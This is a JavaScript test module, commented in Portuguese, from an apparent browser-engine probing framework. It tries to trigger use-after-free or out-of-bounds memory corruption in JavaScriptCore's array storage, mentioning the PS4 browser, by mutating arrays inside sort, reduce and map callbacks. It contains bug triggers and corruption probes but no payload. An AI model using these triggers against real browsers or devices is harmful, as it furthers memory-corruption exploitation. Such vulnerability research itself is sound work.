/**
 * CENÁRIO: NATIVE_CALLBACK_MUTATION_UAF
 * Superfície C++: ArrayPrototype.cpp (sort) / JSArray.cpp (Butterfly)
 * Risco: HIGH
 *
 * Diferença para a versão genérica:
 *   - Versão anterior só testava Array.sort() e não capturava o estado
 *     do Butterfly C++ de forma adequada.
 *   - Versão robusta testa 3 funções nativas que executam callbacks JS
 *     durante iteração sobre o array no C++:
 *     (A) Array.prototype.sort   — muta o array durante comparação
 *     (B) Array.prototype.reduce — muta durante acumulação
 *     (C) Array.prototype.map    — substitui array por TypedArray durante mapeamento
 *   - Cada variante tenta encolher/crescer o array de forma diferente
 *     para invalidar o ponteiro de Butterfly cacheado pelo C++.
 *   - A variante (C) é especialmente interessante no PS4 (sem JIT):
 *     map() em array Holey cria um "hole" que o C++ preenche com JSValue
 *     undefined — se o Butterfly foi realocado, essa escrita vai OOB.
 */

export default {
    id:       'NATIVE_CALLBACK_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description:
        'Funções nativas C++ (sort, reduce, map) com callback JS que muta o array. ' +
        'Atacam o ponteiro de Butterfly cacheado pelo C++ durante iteração. ' +
        'Variante map() em array Holey testa OOB write quando Butterfly é realocado.',

    setup: function() {
        this.log = [];
        this.attacked = { sort: false, reduce: false, map: false };
    },

    trigger: function() {

        // ── VARIANTE A: sort mutation ──────────────────────────────────────
        this.sortArr = Array.from({ length: 60 }, (_, i) => 60.0 - i); // doubles
        try {
            this.sortArr.sort((a, b) => {
                if (!this.attacked.sort) {
                    this.attacked.sort = true;
                    // Encurta o array para 0 durante a ordenação
                    this.sortArr.length = 0;
                    // Pressão de memória para forçar GC e realocar Butterfly
                    const trash = [];
                    for (let i = 0; i < 15; i++) trash.push(new ArrayBuffer(512 * 1024));
                }
                return a - b;
            });
        } catch(e) { this.log.push({ phase: 'sort', err: e.constructor.name }); }

        // ── VARIANTE B: reduce mutation ────────────────────────────────────
        this.reduceArr = Array.from({ length: 40 }, (_, i) => i * 1.1);
        try {
            this.reduceArr.reduce((acc, val, idx) => {
                if (!this.attacked.reduce && idx === 10) {
                    this.attacked.reduce = true;
                    // Expande o array durante a iteração (força realocação do Butterfly)
                    for (let i = 0; i < 1000; i++) this.reduceArr.push(i * 2.2);
                }
                return acc + val;
            }, 0);
        } catch(e) { this.log.push({ phase: 'reduce', err: e.constructor.name }); }

        // ── VARIANTE C: map com array Holey ───────────────────────────────
        this.mapArr = [1.1, 2.2, 3.3];
        this.mapArr[200] = 4.4; // Cria hole gigante — o C++ preenche com undefined JSValue
        try {
            this.mapResult = this.mapArr.map((val, idx) => {
                if (!this.attacked.map && idx === 1) {
                    this.attacked.map = true;
                    // Substitui o backing store: de array Holey para array compacto
                    this.mapArr.length = 0;
                    this.mapArr.push(...Array(5).fill(99.9));
                }
                return val * 2;
            });
        } catch(e) { this.log.push({ phase: 'map', err: e.constructor.name }); }
    },

    probe: [
        // VARIANTE A: sort
        s => s.sortArr.length,        // Deve ser 0. Se C++ forçou outro valor = corrupção
        s => s.sortArr[0],            // Undefined esperado. Qualquer valor = OOB read
        s => s.sortArr[59],
        s => typeof s.sortArr[0],

        // VARIANTE B: reduce
        s => s.reduceArr.length,      // 1040 após expansão. Outro valor = Butterfly corrompido
        s => s.reduceArr[0],
        s => s.reduceArr[39],         // Limite original — se diferente do normal, stale read
        s => s.reduceArr[1039],       // Cauda adicionada durante iteração

        // VARIANTE C: map
        s => s.mapArr.length,         // 5 após reset. Outro valor = corrupção
        s => s.mapArr[0],
        s => s.mapResult?.length,     // Comprimento do resultado do map
        s => s.mapResult?.[0],        // 2.2 esperado (1.1 * 2)
        s => s.mapResult?.[200],      // Hole processado pelo C++ com Butterfly corrompido?

        // Erros registrados
        s => s.log.length,
        s => s.log.map(e => e.phase + ':' + e.err).join(',') || 'none',

        // Estado dos flags de ataque
        s => Object.values(s.attacked).filter(Boolean).length, // Quantos ataques dispararam
    ],

    cleanup: function() {
        this.sortArr   = null;
        this.reduceArr = null;
        this.mapArr    = null;
        this.mapResult = null;
    }
};
